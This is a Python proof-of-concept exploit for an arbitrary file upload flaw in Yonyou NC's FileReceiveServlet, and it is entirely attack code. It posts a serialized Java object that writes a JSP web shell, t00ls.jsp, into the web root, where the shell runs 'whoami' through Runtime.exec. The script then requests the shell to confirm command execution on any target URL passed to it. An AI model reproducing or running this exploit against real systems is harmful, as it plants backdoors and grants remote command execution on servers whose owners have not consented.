import requests
import sys


if __name__ == '__main__':
    url = sys.argv[1]
    uploadHeader = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Referer": "https://google.com",
        "Content-Type": "multipart/form-data;boundary=a1b37aa941c9f61c034924dbf7e8b486",
    }
    uploadData = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
    dork = '''<% {java.io.InputStream in = Runtime.getRuntime().exec("whoami").getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println("whoami:"+new String(b));};} %>'''
    uploadData += dork
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    }
    try:
        vuln_url = url + '/servlet/FileReceiveServlet'
        response = requests.post(url=vuln_url, headers=uploadHeader, data=uploadData, timeout=12)
        if response.status_code == 200:
            check_url = url + '/t00ls.jsp'
            res = requests.get(check_url, headers=headers, timeout=12)
            if 'whoami' in res.text and res.status_code == 200:
                print(url + " 存在用友nc任意文件上传漏洞，测试文件上传成功。"+"\n"+"文件地址为：" + url + "/t00ls.jsp")
                print("测试whoami命令 " + res.text.replace('\r',''))
        else:
            print("\033[31m[x] 请求失败 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m")